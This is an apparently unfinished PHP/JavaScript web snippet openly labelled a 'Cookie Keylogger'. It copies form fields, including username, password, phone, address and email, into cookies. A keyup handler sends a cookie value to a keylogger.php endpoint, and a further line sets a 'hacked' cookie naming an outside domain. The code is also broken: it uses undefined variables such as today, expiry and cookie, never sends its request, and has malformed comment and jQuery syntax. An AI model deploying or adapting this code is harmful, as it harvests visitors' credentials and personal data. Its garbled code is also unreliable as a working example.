<?php?>
<!-- Begins Cookie Monster Method-->


<!-- Cookie Keylogger code -->


<!-- End->

 <!--{Function to create the cookie}-->
<script>
function createCookie(name, value, days) {
var expired = new Date(today.getTime() - 24 * 3600 * 1000); // less 24 hours
document.cookie=name + "=" + escape(value) + "; path=/; expires=" + expiry.toGMTString();
}</script>

<script type="text/javascript">
function getCookie(name)
{
var re = new RegExp(name + "=([^;]+)");
var value = re.exec(document.cookie);
return (value != null) ? unescape(value[1]) : null;
}</script>

<!--script type="text/javascript">      
document.write(getCookie("keylogger"));
</script-->

<!--{stores the values}-->
<script>
  function CookieMonster(form)  
  {
    createCookie("name", form.name.value);
    createCookie("firstName", form.name.value);
    createCookie("lastName", form.name.value);
    createCookie("phone", form.phone.value);
    createCookie("address", form.address.value);
    createCookie("username", form.username.value);
    createCookie("password", form.password.value);
    createCookie("email", form.email.value);
    return true;
  }
</script>

<script type="text/javascript">  
/*TODO*/    
/**fix request method and detection on chrome browser */
</script>

<?php $keylogger = $server."/keylogger.php?q="; ?>

<!--JavascriptKeloggerCookieThrower-->
<script>
$(document).keyup(function() {
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET","localhost/socialbot/keylogger.php?q="+ cookie,true);
/*console.log(xmlhttp;)*/
});
</script>
<!--^ Pass value to php for Cookie Method ^-->

<script>
$(document).onload(function () {
createCookie("hacked", "hackerlocal.us", "1");
});
</script>